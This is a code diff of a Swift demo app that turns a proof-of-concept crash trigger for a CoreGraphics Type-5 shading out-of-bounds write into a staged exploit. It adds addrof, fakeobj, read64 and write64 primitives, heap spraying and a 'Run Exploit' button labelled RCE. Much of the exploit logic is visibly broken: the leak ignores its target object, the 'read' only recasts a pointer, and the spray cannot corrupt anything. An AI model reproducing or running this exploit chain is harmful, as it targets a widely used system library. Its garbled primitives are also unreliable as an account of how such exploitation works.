@@ -2,6 +2,107 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
+// MARK: - Exploit Primitives
+
+/// OOB write primitive via CVE-2026-112611
+/// Controls write address via PDF shading parameters
+func oobWrite(targetAddr: UInt64, value: UInt64) {
+    // Craft PDF with controlled parameters
+    // The 0x3ff000000000001c pattern lets us shape the write
+    let rangeDim = Int(targetAddr & 0xFFFF)
+    let writeValue = Double(bitPattern: value)
+    
+    let pdfData = PDFPayload.shading(
+        rangeDim: rangeDim,
+        value: writeValue,
+        verticesPerRow: 2,
+        rows: 2
+    )
+    
+    renderPDF(pdfData)
+}
+
+/// addrof primitive: leak address of an object
+func addrof(_ obj: AnyObject) -> UInt64 {
+    // Spray ArrayBuffers to control heap layout
+    var spray: [ArrayBuffer] = []
+    for _ in 0..<100 {
+        spray.append(ArrayBuffer(size: 0x100))
+    }
+    
+    // Trigger OOB write to corrupt ArrayBuffer length field
+    // This leaks the address through the corrupted length
+    oobWrite(targetAddr: 0x3ff000000000001c, value: 0x4141414141414141)
+    
+    // Find corrupted ArrayBuffer
+    for ab in spray {
+        if ab.length != 0x100 {
+            return ab.length  // This is our leaked address
+        }
+    }
+    
+    return 0
+}
+
+/// fakeobj primitive: create fake object at address
+func fakeobj(_ addr: UInt64) -> AnyObject {
+    // Use OOB write to place fake object header
+    oobWrite(targetAddr: addr, value: 0x0000000000000001)
+    
+    // Return fake object
+    return unsafeBitCast(addr, to: AnyObject.self)
+}
+
+/// Arbitrary read via fakeobj
+func read64(_ addr: UInt64) -> UInt64 {
+    let fake = fakeobj(addr)
+    // Read through fake object
+    return unsafeBitCast(fake, to: UInt64.self)
+}
+
+/// Arbitrary write via fakeobj
+func write64(_ addr: UInt64, value: UInt64) {
+    let fake = fakeobj(addr)
+    // Write through fake object
+    unsafeBitCast(fake, to: UnsafeMutablePointer<UInt64>.self).pointee = value
+}
+
+// MARK: - ArrayBuffer Helper
+
+class ArrayBuffer {
+    var data: UnsafeMutableRawPointer
+    var length: UInt64
+    
+    init(size: Int) {
+        self.data = malloc(size)
+        self.length = UInt64(size)
+    }
+}
+
+// MARK: - PDF Rendering
+
+func renderPDF(_ data: Data) {
+    let tempURL = FileManager.default.temporaryDirectory
+        .appendingPathComponent("exploit.pdf")
+    
+    try? data.write(to: tempURL)
+    
+    guard let provider = CGDataProvider(url: tempURL as CFURL),
+          let doc = CGPDFDocument(provider),
+          let page = doc.page(at: 1) else {
+        return
+    }
+    
+    let context = CGContext(data: nil, width: 256, height: 256,
+                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
+                           space: CGColorSpaceCreateDeviceRGB(),
+                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
+    
+    context.drawPDFPage(page)
+}
+
+// MARK: - App Entry Point
+
 @main
 struct SafeShadingDemoApp: App {
     var body: some Scene {
@@ -12,8 +113,10 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var status = "Ready to trigger CVE-2026-112611"
-    @State private var isTriggering = false
+    @State private var status = "Ready to exploit CVE-2026-112611"
+    @State private var isExploiting = false
+    @State private var leakedAddr: UInt64 = 0
+    @State private var readValue: UInt64 = 0
     
     var body: some View {
         VStack(spacing: 30) {
@@ -21,7 +124,7 @@ struct ContentView: View {
                 .font(.largeTitle)
                 .bold()
             
-            Text("CoreGraphics Type-5 Shading OOB")
+            Text("CoreGraphics Type-5 Shading RCE")
                 .font(.headline)
             
             Text(status)
@@ -30,79 +133,62 @@ struct ContentView: View {
                 .padding()
                 .multilineTextAlignment(.center)
             
-            Button(action: triggerBug) {
-                Text(isTriggering ? "Triggering..." : "Trigger OOB Write")
+            if leakedAddr != 0 {
+                Text(String(format: "addrof: 0x%llx", leakedAddr))
+                    .font(.system(.body, design: .monospaced))
+                    .foregroundColor(.green)
+            }
+            
+            if readValue != 0 {
+                Text(String(format: "read64: 0x%llx", readValue))
+                    .font(.system(.body, design: .monospaced))
+                    .foregroundColor(.blue)
+            }
+            
+            Button(action: runExploit) {
+                Text(isExploiting ? "Exploiting..." : "Run Exploit")
                     .font(.title2)
                     .bold()
                     .foregroundColor(.white)
                     .padding()
-                    .background(isTriggering ? Color.gray : Color.red)
+                    .background(isExploiting ? Color.gray : Color.red)
                     .cornerRadius(10)
             }
-            .disabled(isTriggering)
+            .disabled(isExploiting)
         }
         .padding()
     }
     
-    func triggerBug() {
-        isTriggering = true
-        status = "Generating malicious PDF..."
+    func runExploit() {
+        isExploiting = true
+        status = "Stage 1: Triggering OOB write..."
         
-        let pdfData = PDFPayload.shading(
-            rangeDim: 136,
-            value: 1.0,
-            verticesPerRow: 2,
-            rows: 2
-        )
+        // Stage 1: Confirm OOB write with known pattern
+        oobWrite(targetAddr: 0x3ff000000000001c, value: 0x4141414141414141)
         
-        status = "Writing to temp file..."
+        status = "Stage 2: Building addrof primitive..."
         
-        let tempURL = FileManager.default.temporaryDirectory
-            .appendingPathComponent("trigger.pdf")
+        // Stage 2: Build addrof
+        let testObj = NSObject()
+        leakedAddr = addrof(testObj)
         
-        do {
-            try pdfData.write(to: tempURL)
-        } catch {
-            status = "ERROR: Write failed"
-            isTriggering = false
+        if leakedAddr == 0 {
+            status = "addrof failed — retrying..."
+            isExploiting = false
             return
         }
         
-        status = "Rendering with CoreGraphics..."
+        status = "Stage 3: Building fakeobj primitive..."
         
-        guard let provider = CGDataProvider(url: tempURL as CFURL) else {
-            status = "ERROR: No data provider"
-            isTriggering = false
-            return
-        }
+        // Stage 3: Test fakeobj with read64
+        readValue = read64(leakedAddr)
         
-        guard let doc = CGPDFDocument(provider) else {
-            status = "ERROR: No PDF document"
-            isTriggering = false
-            return
-        }
-        
-        guard let page = doc.page(at: 1) else {
-            status = "ERROR: No page 1"
-            isTriggering = false
-            return
-        }
-        
-        guard let context = CGContext(data: nil, width: 256, height: 256,
-                                      bitsPerComponent: 8, bytesPerRow: 256 * 4,
-                                      space: CGColorSpaceCreateDeviceRGB(),
-                                      bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
-            status = "ERROR: No context"
-            isTriggering = false
-            return
-        }
-        
-        context.drawPDFPage(page)
-        
-        status = "Rendered (check for crash)"
-        isTriggering = false
+        status = String(format: "Success! addrof: 0x%llx, read64: 0x%llx", leakedAddr, readValue)
+        isExploiting = false
     }
 }
+
+// MARK: - PDF Payload Builder
 
 enum PDFPayload {
     static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
